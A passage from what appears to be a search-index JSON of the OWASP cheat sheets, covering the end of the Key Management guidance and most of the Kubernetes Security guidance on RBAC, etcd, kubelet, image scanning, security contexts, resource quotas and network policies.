this: The use of the same key for two different cryptographic processes may weaken the security provided by one or both of the processes. Limiting the use of a key limits the damage that could be done if the key is compromised. Some uses of keys interfere with each other. For example, the length of time the key may be required for each use and purpose. Retention requirements of the data may differ for different data types.","title":"Key Usage"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#cryptographic-module-topics","text":"According to NIST SP800-133 , cryptographic modules are the set of hardware, software, and/or firmware that implements security functions (including cryptographic algorithms and key generation) and is contained within a cryptographic module boundary to provide protection of the keys.","title":"Cryptographic Module Topics"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#key-management-lifecycle-best-practices","text":"","title":"Key Management Lifecycle Best Practices"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#generation","text":"Cryptographic keys shall be generated within cryptographic module with at least a FIPS 140-2 compliance. For explanatory purposes, consider the cryptographic module in which a key is generated to be the key-generating module. Any random value required by the key-generating module shall be generated within that module; that is, the Random Bit Generator that generates the random value shall be implemented within cryptographic module with at least a FIPS 140-2 compliance that generates the key. Hardware cryptographic modules are preferred over software cryptographic modules for protection.","title":"Generation"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#distribution","text":"The generated keys shall be transported (when necessary) using secure channels and shall be used by their associated cryptographic algorithm within at least a FIPS 140-2 compliant cryptographic modules. For additional detail for the recommendations in this section refer to NIST Special Paper 800-133 .","title":"Distribution"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#storage","text":"Developers must understand where cryptographic keys are stored within the application. Understand what memory devices the keys are stored on. Keys must be protected on both volatile and persistent memory, ideally processed within secure cryptographic modules. Keys should never be stored in plaintext format. Ensure all keys are stored in cryptographic vault, such as a hardware security module (HSM) or isolated cryptographic service. If you are planning on storing keys in offline devices/databases, then encrypt the keys using Key Encryption Keys (KEKs) prior to the export of the key material. KEK length (and algorithm) should be equivalent to or greater in strength than the keys being protected. Ensure that keys have integrity protections applied while in storage (consider dual purpose algorithms that support encryption and Message Code Authentication (MAC)). Ensure that standard application level code never reads or uses cryptographic keys in any way and use key management libraries. Ensure that keys and cryptographic operation is done inside the sealed vault. All work should be done in the vault (such as key access, encryption, decryption, signing, etc).","title":"Storage"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#escrow-and-backup","text":"Data that has been encrypted with lost cryptographic keys will never be recovered. Therefore, it is essential that the application incorporate a secure key backup capability, especially for applications that support data at rest encryption for long-term data stores. When backing up keys, ensure that the database that is used to store the keys is encrypted using at least a FIPS 140-2 validated module. It is sometimes useful to escrow key material for use in investigations and for re-provisioning of key material to users in the event that the key is lost or corrupted. Never escrow keys used for performing digital signatures, but consider the need to escrow keys that support encryption. Oftentimes, escrow can be performed by the Certificate Authority (CA) or key management system that provisions certificates and keys, however in some instances separate APIs must be implemented to allow the system to perform the escrow for the application.","title":"Escrow and Backup"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#accountability-and-audit","text":"Accountability involves the identification of those that have access to, or control of, cryptographic keys throughout their lifecycles. Accountability can be an effective tool to help prevent key compromises and to reduce the impact of compromises once they are detected. Although it is preferred that no humans are able to view keys, as a minimum, the key management system should account for all individuals who are able to view plaintext cryptographic keys. In addition, more sophisticated key-management systems may account for all individuals authorized to access or control any cryptographic keys, whether in plaintext or ciphertext form. Accountability provides three significant advantages: It aids in the determination of when the compromise could have occurred and what individuals could have been involved. It tends to protect against compromise, because individuals with access to the key know that their access to the key is known. It is very useful in recovering from a detected key compromise to know where the key was used and what data or other keys were protected by the compromised key. Certain principles have been found to be useful in enforcing the accountability of cryptographic keys. These principles might not apply to all systems or all types of keys. Some of the principles that apply to long-term keys controlled by humans include: Uniquely identifying keys. Identifying the key user. Identifying the dates and times of key use, along with the data that is protected. Identifying other keys that are protected by a symmetric or private key. Two types of audit should be performed on key management systems: The security plan and the procedures that are developed to support the plan should be periodically audited to ensure that they continue to support the Key Management Policy ( NIST SP 800-57 Part 2 ). The protective mechanisms employed should be periodically reassessed with respect to the level of security that they provide and are expected to provide in the future, and that the mechanisms correctly and effectively support the appropriate policies. New technology developments and attacks should be taken into consideration. On a more frequent basis, the actions of the humans that use, operate and maintain the system should be reviewed to verify that the humans continue to follow established security procedures. Strong cryptographic systems can be compromised by lax and inappropriate human actions. Highly unusual events should be noted and reviewed as possible indicators of attempted attacks on the system.","title":"Accountability and Audit"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#key-compromise-and-recovery","text":"The compromise of a key has the following implications: In general, the unauthorized disclosure of a key used to provide confidentiality protection (i.e., via encryption) means that all information encrypted by that key could be exposed or known by unauthorized entities. The disclosure of a Certificate of Authorities's private signature key means that an adversary can create fraudulent certificates and Certificate Revocation Lists (CRLs). A compromise of the integrity of a key means that the key is incorrect - either that the key has been modified (either deliberately or accidentally), or that another key has been substituted; this includes a deletion (non-availability) of the key. The substitution or modification of a key used to provide integrity calls into question the integrity of all information protected by the key. This information could have been provided by, or changed by, an unauthorized entity that knows the key. The substitution of a public or secret key that will be used (at a later time) to encrypt data could allow an unauthorized entity (who knows the decryption key) to decrypt data that was encrypted using the encryption key. A compromise of a key's usage or application association means that the key could be used for the wrong purpose (e.g., for key establishment instead of digital signatures) or for the wrong application, and could result in the compromise of information protected by the key. A compromise of a key's association with the owner or other entity means that the identity of the other entity cannot be assured (i.e., one does not know who the other entity really is) or that information cannot be processed correctly (e.g., decrypted with the correct key). A compromise of a key's association with other information means that there is no association at all, or the association is with the wrong \"information\". This could cause the cryptographic services to fail, information to be lost, or the security of the information to be compromised. Certain protective measures may be taken in order to minimize the likelihood or consequences of a key compromise. Similar affect as ransomware, except that you can't pay the ransom and get the key back. The following procedures are usually involved: Limiting the amount of time a symmetric or private key is in plaintext form. Preventing humans from viewing plaintext symmetric and private keys. Restricting plaintext symmetric and private keys to physically protected containers. This includes key generators, key-transport devices, key loaders, cryptographic modules, and key-storage devices. Using integrity checks to ensure that the integrity of a key or its association with other data has not been compromised. For example, keys may be wrapped (i.e., encrypted) in such a manner that unauthorized modifications to the wrapping or to the associations will be detected. Employing key confirmation (see NIST SP 800-57 Part 1 Section 4.2.5.5) to help ensure that the proper key was, in fact, established. Establishing an accountability system that keeps track of each access to symmetric and private keys in plaintext form. Providing a cryptographic integrity check on the key (e.g., using a MAC or a digital signature). The use of trusted timestamps for signed data. i. Destroying keys as soon as they are no longer needed. Creating a compromise-recovery plan, especially in the case of a CA compromise. A compromise-recovery plan is essential for restoring cryptographic security services in the event of a key compromise. A compromise-recovery plan shall be documented and easily accessible. The compromise-recovery plan should contain: The identification and contact info of the personnel to notify. The identification and contact info of the personnel to perform the recovery actions. The re-key method. An inventory of all cryptographic keys and their use (e.g., the location of all certificates in a system). The education of all appropriate personnel on the recovery procedures. An identification and contact info of all personnel needed to support the recovery procedures. Policies that key-revocation checking be enforced (to minimize the effect of a compromise). The monitoring of the re-keying operations (to ensure that all required operations are performed for all affected keys). Any other recovery procedures, which may include: Physical inspection of the equipment. Identification of all information that may be compromised as a result of the incident. Identification of all signatures that may be invalid, due to the compromise of a signing key. Distribution of new keying material, if required.","title":"Key Compromise and Recovery"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#trust-stores","text":"Design controls to secure the trust store against injection of third-party root certificates. The access controls are managed and enforced on an entity and application basis. Implement integrity controls on objects stored in the trust store. Do not allow for export of keys held within the trust store without authentication and authorization. Setup strict policies and procedures for exporting key material from applications to network applications and other components. Implement a secure process for updating the trust store.","title":"Trust Stores"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#cryptographic-key-management-libraries","text":"Use only reputable crypto libraries that are well maintained and updated, as well as tested and validated by third-party organizations (e.g., NIST / FIPS )","title":"Cryptographic Key Management Libraries"},{"location":"cheatsheets/Key_Management_Cheat_Sheet.html#documentation","text":"The definitive guide to encryption key management fundamentals . Practical cryptography for developers .","title":"Documentation"},{"location":"cheatsheets/Kubernetes_Security_Cheat_Sheet.html","text":"Kubernetes Security Cheat Sheet \u00b6 Kubernetes \u00b6 Kubernetes is an open source container orchestration engine for automating deployment, scaling, and management of containerized applications. The open source project is hosted by the Cloud Native Computing Foundation (CNCF). When you deploy Kubernetes, you get a cluster. A Kubernetes cluster consists of a set of worker machines, called nodes that run containerized applications. The control plane manages the worker nodes and the Pods in the cluster. Control Plane Components \u00b6 The control plane's components make global decisions about the cluster, as well as detecting and responding to cluster events. It consists of components such as kube-apiserver, etcd, kube-scheduler, kube-controller-manager and cloud-controller-manager Component Description kube-apiserver kube-apiserver exposes the Kubernetes API. The API server is the front end for the Kubernetes control plane. etcd etcd is a consistent and highly-available key-value store used as Kubernetes' backing store for all cluster data. kube-scheduler kube-scheduler watches for newly created Pods with no assigned node, and selects a node for them to run on. kube-controller-manager kube-controller-manager runs controller processes. Logically, each controller is a separate process, but to reduce complexity, they are all compiled into a single binary and run in a single process. cloud-controller-manager The cloud controller manager lets you link your cluster into your cloud provider's API, and separates out the components that interact with that cloud platform from components that just interact with your cluster. Node Components \u00b6 Node components run on every node, maintaining running pods and providing the Kubernetes runtime environment. It consists of components such as kubelet, kube-proxy and container runtime. Component Description kubelet kubelet is an agent that runs on each node in the cluster. It makes sure that containers are running in a Pod kube-proxy kube-proxy is a network proxy that runs on each node in your cluster, implementing part of the Kubernetes Service concept Container runtime The container runtime is the software that is responsible for running containers. This cheatsheet provides a starting point for securing Kubernetes cluster. It is divided into the following categories: Securing Kubernetes hosts Securing Kubernetes components Kubernetes Security Best Practices: Build Phase Kubernetes Security Best Practices: Deploy Phase Kubernetes Security Best Practices: Runtime Phase Securing Kubernetes hosts \u00b6 There are several options available to deploy Kubernetes: on bare metal, on-premise, and in the public cloud (custom Kubernetes build on virtual machines OR use a managed service). Kubernetes was designed to be highly portable and customers can easily switch between these installations, migrating their workloads. All of this potential customisation of Kubernetes means it can be designed to fit a large variety of scenarios; however, this is also its greatest weakness when it comes to security. Kubernetes is designed out of the box to be customizable and users must turn on certain functionality to secure their cluster. This means that the engineers responsible for deploying the Kubernetes platform need to know about all the potential attack vectors and vulnerabilities poor configuration can lead to. It is recommended to harden the underlying hosts by installing the latest version of operating system, hardening the operating system, implement necessary patch management and configuration management system, implementing essential firewall rules and undertake specific security measures depending on the datacenter environment. Kubernetes Version \u00b6 It has become impossible to track all potential attack vectors. This fact is unfortunate as there is nothing more vital than to be aware and on top of potential threats. The best defense is to make sure that you are running the latest available version of Kubernetes. The Kubernetes project maintains release branches for the most recent three minor releases and it backports the applicable fixes, including security fixes, to those three release branches, depending on severity and feasibility. Patch releases are cut from those branches at a regular cadence, plus additional urgent releases, when required. Hence it is always recommended to upgrade the Kubernetes cluster to the latest available stable version. It is recommended to refer to the version skew policy for further details https://kubernetes.io/docs/setup/release/version-skew-policy/ . There are several techniques such as rolling updates, and node pool migrations that allow you to complete an update with minimal disruption and downtime. Securing Kubernetes components \u00b6 Control network access to sensitive ports \u00b6 Kubernetes clusters usually listen on a range of well-defined and distinctive ports which makes it easier identify the clusters and attack them. Hence it is highly recommended to configure authentication and authorization on the cluster and cluster nodes. Here is an overview of the default ports used in Kubernetes. Make sure that your network blocks access to ports and consider limiting access to the Kubernetes API server except from trusted networks. Master node(s): Protocol Port Range Purpose TCP 6443- Kubernetes API Server TCP 2379-2380 etcd server client API TCP 10250 Kubelet API TCP 10251 kube-scheduler TCP 10252 kube-controller-manager TCP 10255 Read-Only Kubelet API Worker nodes: Protocol Port Range Purpose TCP 10250 Kubelet API TCP 10255 Read-Only Kubelet API TCP 30000-32767 NodePort Services Limit Direct Access to Kubernetes Nodes \u00b6 You should limit SSH access to Kubernetes nodes, reducing the risk for unauthorized access to host resource. Instead you should ask users to use \"kubectl exec\", which will provide direct access to the container environment without the ability to access the host. You can use Kubernetes Authorization Plugins to further control user access to resources. This allows defining fine-grained-access control rules for specific namespace, containers and operations. Controlling access to the Kubernetes API \u00b6 The Kubernetes platform is controlled using API requests and as such is the first line of defense against attackers. Controlling who has access and what actions they are allowed to perform is the primary concern. For more information, refer to the documentation at https://kubernetes.io/docs/reference/access-authn-authz/controlling-access/ . Use Transport Layer Security \u00b6 Communication in the cluster between services should be handled using TLS, encrypting all traffic by default. This, however, is often overlooked with the thought being that the cluster is secure and there is no need to provide encryption in transit within the cluster. Advances in network technology, such as the service mesh, have led to the creation of products like LinkerD and Istio which can enable TLS by default while providing extra telemetry information on transactions between services. Kubernetes expects that all API communication in the cluster is encrypted by default with TLS, and the majority of installation methods will allow the necessary certificates to be created and distributed to the cluster components. Note that some components and installation methods may enable local ports over HTTP and administrators should familiarize themselves with the settings of each component to identify potentially unsecured traffic. To learn more on usage of TLS in Kubernetes cluster, refer to the documentation at https://kubernetes.io/blog/2018/07/18/11-ways-not-to-get-hacked/#1-tls-everywhere . API Authentication \u00b6 Choose an authentication mechanism for the API servers to use that matches the common access patterns when you install a cluster. For instance, small single user clusters may wish to use a simple certificate or static Bearer token approach. Larger clusters may wish to integrate an existing OIDC or LDAP server that allow users to be subdivided into groups. All API clients must be authenticated, even those that are part of the infrastructure like nodes, proxies, the scheduler, and volume plugins. These clients are typically service accounts or use x509 client certificates, and they are created automatically at cluster startup or are setup as part of the cluster installation. For more information, consult Kubernetes authentication reference document at https://kubernetes.io/docs/reference/access-authn-authz/authentication API Authorization - Implement role-based access control \u00b6 In Kubernetes, you must be authenticated (logged in) before your request can be authorized (granted permission to access). Kubernetes expects attributes that are common to REST API requests. This means that Kubernetes authorization works with existing organization-wide or cloud-provider-wide access control systems which may handle other APIs besides the Kubernetes API. Kubernetes authorizes API requests using the API server. It evaluates all of the request attributes against all policies and allows or denies the request. All parts of an API request must be allowed by some policy in order to proceed. This means that permissions are denied by default. Role-based access control (RBAC) is a method of regulating access to computer or network resources based on the roles of individual users within your organization. Kubernetes ships an integrated Role-Based Access Control (RBAC) component that matches an incoming user or group to a set of permissions bundled into roles. These permissions combine verbs (get, create, delete) with resources (pods, services, nodes) and can be namespace or cluster scoped. A set of out of the box roles are provided that offer reasonable default separation of responsibility depending on what actions a client might want to perform. It is recommended that you use the Node and RBAC authorizers together, in combination with the NodeRestriction admission plugin. RBAC authorization uses the rbac.authorization.k8s.io API group to drive authorization decisions, allowing you to dynamically configure policies through the Kubernetes API. To enable RBAC, start the API server with the --authorization-mode flag set to a comma-separated list that includes RBAC; for example: # kube-apiserver --authorization-mode=Example,RBAC --other-options --more-options For detailed examples of utilizing RBAC, refer to Kubernetes documentation at https://kubernetes.io/docs/reference/access-authn-authz/rbac Restrict access to etcd \u00b6 etcd is a critical Kubernetes component which stores information on state and secrets, and it should be protected differently from the rest of your cluster. Write access to the API server's etcd is equivalent to gaining root on the entire cluster, and even read access can be used to escalate privileges fairly easily. The Kubernetes scheduler will search etcd for pod definitions that do not have a node. It then sends the pods it finds to an available kubelet for scheduling. Validation for submitted pods is performed by the API server before it writes them to etcd, so malicious users writing directly to etcd can bypass many security mechanisms - e.g. PodSecurityPolicies. Administrators should always use strong credentials from the API servers to their etcd server, such as mutual auth via TLS client certificates, and it is often recommended to isolate the etcd servers behind a firewall that only the API servers may access. Caution \u00b6 Allowing other components within the cluster to access the master etcd instance with read or write access to the full keyspace is equivalent to granting cluster-admin access. Using separate etcd instances for non-master components or using etcd ACLs to restrict read and write access to a subset of the keyspace is strongly recommended. Controlling access to the Kubelet \u00b6 Kubelets expose HTTPS endpoints which grant powerful control over the node and containers. By default Kubelets allow unauthenticated access to this API. Production clusters should enable Kubelet authentication and authorization. For more information, refer to Kubelet authentication/authorization documentation at https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-authentication-authorization Securing Kubernetes Dashboard \u00b6 The Kubernetes dashboard is a webapp for monitoring your cluster. It it is not a part of the Kubernetes cluster itself, it has to be installed by the owners of the cluster. Thus, there are a lot of tutorials on how to do this. Unfortunately, most of them create a service account with very high privileges. This caused Tesla and some others to be hacked via such a poorly configured K8s dashboard. (Reference: Tesla cloud resources are hacked to run cryptocurrency-mining malware - https://arstechnica.com/information-technology/2018/02/tesla-cloud-resources-are-hacked-to-run-cryptocurrency-mining-malware/ ) To prevent attacks via the dashboard, you should follow some tips: Do not expose the dashboard to the public. There is no need to access such a powerful tool from outside your LAN Turn on RBAC, so you can limit the service account the dashboard uses Do not grant the service account of the dashboard high privileges Grant permissions per user, so each user only can see what he is supposed to see If you are using network policies, you can block requests to the dashboard even from internal pods (this will not affect the proxy tunnel via kubectl proxy) Before version 1.8, the dashboard had a service account with full privileges, so check that there is no role binding for cluster-admin left. Kubernetes Security Best Practices: Build Phase \u00b6 Securing containers and Kubernetes starts in the build phase with securing your container images. The two main things to do here are to build secure images and to scan those images for any known vulnerabilities. A Container image is an immutable, lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings [ https://www.docker.com/resources/what-container ]. The image shares the kernel of the operating system present in its host machine. Container images must be built using approved and secure base image that is scanned and monitored at regular intervals to ensure only secure and authentic images can be used within the cluster. It is recommended to configure strong governance policies regarding how images are built and stored in trusted image registries. Ensure That Only Authorized Images are used in Your Environment \u00b6 Without a process that ensures that only images adhering to the organization\u2019s policy are allowed to run, the organization is open to risk of running vulnerable or even malicious containers. Downloading and running images from unknown sources is dangerous. It is equivalent to running software from an unknown vendor on a production server. Don\u2019t do that. Container registry and the use of an image scanner to identify known vulnerabilities \u00b6 Container registry is the central repository of container images. Based on the needs, we can utilize public repositories or have a private repository as the container registry. Use private registries to store your approved images - make sure you only push approved images to these registries. This alone reduces the number of potential images that enter your pipeline to a fraction of the hundreds of thousands of publicly available images. Build a CI pipeline that integrates security assessment (like vulnerability scanning), making it part of the build process. The CI pipeline should ensure that only vetted code (approved for production) is used for building the images. Once an image is built, it should be scanned for security vulnerabilities, and only if no issues are found then the image would be pushed to a private registry, from which deployment to production is done. A failure in the security assessment should create a failure in the pipeline, preventing images with bad security quality from being pushed to the image registry. There is work in progress being done in Kubernetes for image authorization plugins, which will allow preventing the shipping of unauthorized images. For more information, refer to the PR https://github.com/kubernetes/kubernetes/pull/27129 . Use minimal base images and avoid adding unnecessary components \u00b6 Avoid using images with OS package managers or shells because they could contain unknown vulnerabilities. If you must include OS packages, remove the package manager at a later step. Consider using minimal images such as distroless images, as an example. Distroless images \u00b6 Restricting what's in your runtime container to precisely what's necessary for your app is a best practice employed by Google and other tech giants that have used containers in production for many years. It improves the signal to noise of scanners (e.g. CVE) and reduces the burden of establishing provenance to just what you need. For more information on ditroless images, refer to https://github.com/GoogleContainerTools/distroless . Use the latest images/ensure images are up to date \u00b6 Ensure your images (and any third-party tools you include) are up to date and utilizing the latest versions of their components. Kubernetes Security Best Practices: Deploy Phase \u00b6 Kubernetes infrastructure should be configured securely prior to workloads being deployed. From a security perspective, you first need visibility into what you\u2019re deploying \u2013 and how. Then you can identify and respond to security policy violations. At a minimum, you need to know: What is being deployed - including information about the image being used, such as components or vulnerabilities, and the pods that will be deployed Where it is going to be deployed - which clusters, namespaces, and nodes How it is deployed - whether it runs privileged, what other deployments it can communicate with, the pod security context that is applied, if any What it can access - including secrets, volumes, and other infrastructure components such as the host or orchestrator API Is it compliant - whether it complies with your policies and security requirements Use Kubernetes namespaces to properly isolate your Kubernetes resources \u00b6 Namespaces give you the ability to create logical partitions and enforce separation of your resources as well as limit the scope of user permissions. Setting the namespace for a request \u00b6 To set the namespace for a current request, use the --namespace flag. Refer to the following examples: kubectl run nginx --image = nginx --namespace = <insert-namespace-name-here> kubectl get pods --namespace = <insert-namespace-name-here> Setting the namespace preference \u00b6 You can permanently save the namespace for all subsequent kubectl commands in that context. kubectl config set-context --current --namespace = <insert-namespace-name-here> Validate it with the following command. kubectl config view --minify | grep namespace: Learn more about namespaces at https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces Create policies to govern image provenance using the ImagePolicyWebhook \u00b6 Prevent unapproved images from being used with the admission controller ImagePolicyWebhook to reject pods that use unapproved images including: Images that haven\u2019t been scanned recently Images that use a base image that\u2019s not whitelisted Images from insecure registries Learn more about webhook at https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/#imagepolicywebhook Implement Continuous Security Vulnerability Scanning \u00b6 New vulnerabilities are published every day and containers might include outdated packages with known vulnerabilities (CVEs). Hence it is recommended to implement an ongoing process, where images are continuously assessed, is crucial to insure a required security posture. Regularly Apply Security Updates to Your Environment \u00b6 In case vulnerabilities are found in running containers, it is recommended to always update the source image and redeploy the containers. NOTE \u00b6 Try to avoid direct updates to the running containers as this can break the image-container relationship. Example: apt-update Upgrading containers is extremely easy with the Kubernetes rolling updates feature - this allows gradually updating a running application by upgrading its images to the latest version. Assess the privileges used by containers \u00b6 The set of capabilities, role bindings, and privileges given to containers can greatly impact your security risk. The goal here is to adhere to the principle of least privilege and provide the minimum privileges and capabilities that would allow the container to perform its intended function. Pod Security Policies are one way to control the security-related attributes of pods, including container privilege levels. These can allow an operator to specify the following: Do not run application processes as root. Do not allow privilege escalation. Use a read-only root filesystem. Use the default (masked) /proc filesystem mount Do not use the host network or process space - using \"hostNetwork:true\" will cause NetworkPolicies to be ignored since the Pod will use its host network. Drop unused and unnecessary Linux capabilities. Use SELinux options for more fine-grained process controls. Give each application its own Kubernetes Service Account. Do not mount the service account credentials in a container if it does not need to access the Kubernetes API. For more information on Pod security policies, refer to the documentation at https://kubernetes.io/docs/concepts/policy/pod-security-policy/ . Apply Security Context to Your Pods and Containers \u00b6 A security context is a property defined in the deployment yaml. It controls the security parameters that will be assigned to the pod/container/volume. These controls can eliminate entire classes of attacks that depend on privileged access. Read-only root file systems, for example, can prevent any attack that depends on installing software or writing to the file system. When designing your containers and pods, make sure that you configure the security context for your pods, containers and volumes to grant only the privileges needed for the resource to function. Some of the important parameters are as follows: Security Context Setting Description SecurityContext->runAsNonRoot Indicates that containers should run as non-root user SecurityContext->Capabilities Controls the Linux capabilities assigned to the container. SecurityContext->readOnlyRootFilesystem Controls whether a container will be able to write into the root filesystem. PodSecurityContext->runAsNonRoot Prevents running a container with 'root' user as part of the pod Here is an example for pod definition with security context parameters: apiVersion: v1 kind: Pod metadata: name: hello-world spec: containers: # specification of the pod\u2019s containers # ... # ... # Security Context securityContext: readOnlyRootFilesystem: true runAsNonRoot: true For more information on security context for Pods, refer to the documentation at https://kubernetes.io/docs/tasks/configure-pod-container/security-context Implement Service Mesh \u00b6 A service mesh is an infrastructure layer for microservices applications that can help reduce the complexity of managing microservices and deployments by handling infrastructure service communication quickly, securely and reliably. Service meshes are great at solving operational challenges and issues when running containers and microservices because they provide a uniform way to secure, connect and monitor microservices. Service mesh provides the following advantages: Obeservability \u00b6 Service Mesh provides tracing and telemetry metrics that make it easy to understand your system and quickly root cause any problems. Security \u00b6 A service mesh provides security features aimed at securing the services inside your network and quickly identifying any compromising traffic entering your cluster. A service mesh can help you more easily manage security through mTLS, ingress and egress control, and more. mTLS and Why it Matters Securing microservices is hard. There are a multitude of tools that address microservices security, but service mesh is the most elegant solution for addressing encryption of on-the-wire traffic within the network. Service mesh provides defense with mutual TLS (mTLS) encryption of the traffic between your services. The mesh can automatically encrypt and decrypt requests and responses, removing that burden from the application developer. It can also improve performance by prioritizing the reuse of existing, persistent connections, reducing the need for the computationally expensive creation of new ones. With service mesh, you can secure traffic over the wire and also make strong identity-based authentication and authorizations for each microservice. We see a lot of value in this for enterprise companies. With a good service mesh, you can see whether mTLS is enabled and working between each of your services and get immediate alerts if security status changes. Ingress & Egress Control Service mesh adds a layer of security that allows you to monitor and address compromising traffic as it enters the mesh. Istio integrates with Kubernetes as an ingress controller and takes care of load balancing for ingress. This allows you to add a level of security at the perimeter with ingress rules. Egress control allows you to see and manage external services and control how your services interact with them. Operational Control \u00b6 A service mesh allows security and platform teams to set the right macro controls to enforce access controls, while allowing developers to make customizations they need to move quickly within these guardrails. RBAC \u00b6 A strong Role Based Access Control (RBAC) system is arguably one of the most critical requirements in large engineering organizations, since even the most secure system can be easily circumvented by overprivileged users or employees. Restricting privileged users to least privileges necessary to perform job responsibilities, ensuring access to systems are set to \u201cdeny all\u201d by default, and ensuring proper documentation detailing roles and responsibilities are in place is one of the most critical security concerns in the enterprise. Disadvantages \u00b6 Along with the many advantages, Service mesh also brings in its set of challenges, few of them are listed below: Added Complexity: The introduction of proxies, sidecars and other components into an already sophisticated environment dramatically increases the complexity of development and operations. Required Expertise: Adding a service mesh such as Istio on top of an orchestrator such as Kubernetes often requires operators to become experts in both technologies. Slowness: Service meshes are an invasive and intricate technology that can add significant slowness to an architecture. Adoption of a Platform: The invasiveness of service meshes force both developers and operators to adapt to a highly opinionated platform and conform to its rules. Implementing Open Policy Agent (OPA) for a centralized policy management \u00b6 OPA is a project that started in 2016 aimed at unifying policy enforcement across different technologies and systems. It can be used to enforce policies on their platforms (like Kubernetes clusters). When it comes to Kubernetes, RBAC and Pod security policies to impose fine-grained control over the cluster. But again, this will only apply to the cluster but not outside the cluster. That\u2019s where Open Policy Agent (OPA) comes into play. OPA was introduced to create a unified method of enforcing security policy in the stack. OPA is a general-purpose, domain-agnostic policy enforcement tool. It can be integrated with APIs, the Linux SSH daemon, an object store like CEPH, etc. OPA designers purposefully avoided basing it on any other project. Accordingly, the policy query and decision do not follow a specific format. That is, you can use any valid JSON data as request attributes as long as it provides the required data. Similarly, the policy decision coming from OPA can also be any valid JSON data. You choose what gets input and what gets output. For example, you can opt to have OPA return a True or False JSON object, a number, a string, or even a complex data object. Currently, OPA is part of CNCF as an incubating project. Most common use cases of OPA: Application authorization OPA enables you to accelerate time to market by providing pre-cooked authorization technology so you don\u2019t have to develop it from scratch. It uses a declarative policy language purpose built for writing and enforcing rules such as, \u201cAlice can write to this repository,\u201d or \u201cBob can update this account.\u201d It comes with a rich suite of tooling to help developers integrate those policies into their applications and even allow the application\u2019s end users to contribute policy for their tenants as well. If you have homegrown application authorization solutions in place, you may not want to rip them out to swap in OPA. At least not yet. But if you are going to be decomposing those monolithic apps and moving to microservices to scale and improve developer efficiency, you\u2019re going to need a distributed authorization system and OPA is the answer. Kubernetes admission control Kubernetes has given developers tremendous control over the traditional silos of compute, networking and storage. Developers today can set up the network the way they want and set up storage the way they want. Administrators and security teams responsible for the well-being of a given container cluster need to make sure developers don\u2019t shoot themselves (or their neighbors) in the foot. OPA can be used to build policies that require, for example, all container images to be from trusted sources, that prevent developers from running software as root, that make sure storage is always marked with the encrypt bit, that storage does not get deleted just because a pod gets restarted, that limits internet access, etc. OPA integrates directly into the Kubernetes API server, so it has complete authority to reject any resource\u2014whether compute, networking, storage, etc.\u2014that policy says doesn\u2019t belong in a cluster. Moreover, you can expose those policies earlier in the development lifecycle (e.g. the CICD pipeline or even on developer laptops) so that developers can receive feedback as early as possible. You can even run policies out-of-band to monitor results so that administrators can ensure policy changes don\u2019t inadvertently do more damage than good. Service mesh authorization And finally, many organizations are using OPA to regulate use of service mesh architectures. So, even if you\u2019re not embedding OPA to implement application authorization logic (the top use case discussed above), you probably still want control over the APIs microservices. You can execute and achieve that by putting authorization policies into the service mesh. Or, you may be motivated by security, and implement policies in the service mesh to limit lateral movement within a microservice architecture. Another common practice is to build policies into the service mesh to ensure your compliance regulations are satisfied even when modification to source code is involved. Limiting resource usage on a cluster \u00b6 Resource quota limits the number or capacity of resources granted to a namespace. This is most often used to limit the amount of CPU, memory, or persistent disk a namespace can allocate, but can also control how many pods, services, or volumes exist in each namespace. Limit ranges restrict the maximum or minimum size of some of the resources above, to prevent users from requesting unreasonably high or low values for commonly reserved resources like memory, or to provide default limits when none are specified An option of running resource-unbound containers puts your system in risk of DoS or \u201cnoisy neighbor\u201d scenarios. To prevent and minimize those risks you should define resource quotas. By default, all resources in Kubernetes cluster are created with unbounded CPU and memory requests/limits. You can create resource quota policies, attached to Kubernetes namespace, in order to limit the CPU and memory a pod is allowed to consume. The following is an example for namespace resource quota definition that will limit number of pods in the namespace to 4, limiting their CPU requests between 1 and 2 and memory requests between 1GB to 2GB. compute-resources.yaml: apiVersion: v1 kind: ResourceQuota metadata: name: compute-resources spec: hard: pods: \"4\" requests.cpu: \"1\" requests.memory: 1Gi limits.cpu: \"2\" limits.memory: 2Gi Assign a resource quota to namespace: # kubectl create -f ./compute-resources.yaml --namespace=myspace Use Kubernetes network policies to control traffic between pods and clusters \u00b6 Running different applications on the same Kubernetes cluster creates a risk of one compromised application attacking a neighboring application. Network segmentation is important to ensure that containers can communicate only with those they are supposed to. By default, Kubernetes allows every pod to contact every other pod. Traffic to a pod from an external network endpoint outside the cluster is allowed if ingress from that endpoint is allowed to the pod. Traffic from a pod to an external network endpoint outside the cluster is allowed if egress is allowed from the pod to that endpoint. Network segmentation policies are a key security control that can prevent lateral movement across containers in the case that an attacker breaks in. One of the challenges in Kubernetes deployments is creating network segmentation between pods, services and containers. This is a challenge due to the \u201cdynamic\u201d nature of container network identities (IPs), along with the fact that containers can communicate both inside the same node or between nodes. Users of Google Cloud Platform can benefit from automatic firewall rules, preventing cross-cluster communication. A similar implementation can be deployed on-premises using network firewalls or SDN solutions. There is work being done in this area by the Kubernetes Network SIG, which will greatly improve the pod-to-pod communication policies. A new network policy API should address the need to create firewall rules around pods, limiting the network access that a containerized can have. The following is an example of a network policy that controls the network for \u201cbackend\u201d pods, only allowing inbound network access from \u201cfrontend\u201d pods: POST /apis/net.alpha.kubernetes.io/v1alpha1/namespaces/tenant-a/networkpolicys { \"kind\" : \"NetworkPolicy\" , \"metadata\" : { \"name\" : \"pol1\" } , \"spec\" : { \"allowIncoming\" : { \"from\" : [{ \"pods\" : { \"segment\" : \"frontend\" } }] , \"toPorts\" : [{ \"port\" : 80 , \"protocol\" : \"TCP\" }] } , \"podSelector\" : { \"segment\" : \"backend\" } } } For more information on configuring network policies, refer to the Kubernetes documentation at https://kubernetes.io/docs/concepts/services-networking/network-policies . Securing data \u00b6 Keeps secrets as secrets \u00b6 In Kubernetes, a Secret is a small 